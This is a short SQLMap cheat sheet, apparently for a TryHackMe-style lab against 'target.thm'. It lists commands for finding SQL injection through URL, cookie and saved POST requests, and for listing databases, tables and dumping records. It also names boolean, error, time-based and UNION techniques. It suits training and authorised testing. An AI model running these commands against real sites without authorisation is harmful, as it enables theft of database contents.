# SQLMap Quick Reference

**SQLMap** is an automated command-line tool used to detect and exploit SQL injection vulnerabilities in web applications. It automates the process of identifying vulnerabilities, extracting database structures, and dumping data.

## Basic Usage & Modes

| Command | Description |
| :--- | :--- |
| `sqlmap --help` | Lists all available flags and options. |
| `sqlmap --wizard` | Launches an interactive, step-by-step guide (ideal for beginners). |

---

## Targeting Methods

How you target a web application depends on how it accepts data (e.g., via URL parameters, cookies, or form submissions).

| Flag / Command | Use Case | Example |
| :--- | :--- | :--- |
| **`-u`** | **GET-based testing:** Tests a URL containing GET parameters. | `sqlmap -u http://target.thm/search?cat=1` |
| **`--cookie`** | **Cookie-based testing:** Injects session IDs to test authenticated areas. | `sqlmap -u <URL> --cookie="SESSIONID=1234"` |
| **`-r`** | **POST-based testing:** Tests an intercepted HTTP request saved as a text file. | `sqlmap -r intercepted_request.txt` |

---

## Database Enumeration & Extraction

Once a vulnerability is found, use these flags in sequence to dig into the database and extract records.

1. **Find Databases**
   Use the `--dbs` flag to list all available databases on the backend.
   ```bash
   sqlmap -u http://target.thm/search?cat=1 --dbs
   ```

2. **Find Tables**
   Use the `-D` flag to select a specific database, followed by `--tables` to list its tables.
   ```bash
   sqlmap -u http://target.thm/search?cat=1 -D users --tables
   ```

3. **Dump Records**
   Use `-D` for the database, `-T` for the specific table, and `--dump` to extract the actual data entries.
   ```bash
   sqlmap -u http://target.thm/search?cat=1 -D users -T thomas --dump
   ```

---

## Injection Techniques Identified by SQLMap

When scanning, SQLMap may identify and utilize several injection techniques:
* **Boolean-based blind:** Injects true/false boolean statements (e.g., `1=1`) to observe application behavior.
* **Error-based:** Intentionally causes database errors to reveal structural data in the output.
* **Time-based blind:** Forces the database to wait (e.g., `SLEEP(5)`) to infer vulnerabilities based on response time.
* **UNION query:** Uses the `UNION` operator to combine the results of the original query with an injected query.
